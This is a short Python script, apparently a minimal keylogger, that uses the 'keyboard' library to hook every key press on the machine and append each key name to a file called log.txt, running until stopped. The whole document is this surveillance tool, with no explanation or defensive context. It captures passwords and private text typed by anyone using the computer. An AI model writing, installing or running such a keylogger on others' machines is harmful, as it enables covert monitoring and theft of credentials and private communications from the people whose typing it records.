import keyboard

file = 'log.txt'

def save_keystroke(event):
    with open(file, 'a') as f:
        f.write(event.name)

keyboard.on_press(save_keystroke)

keyboard.wait()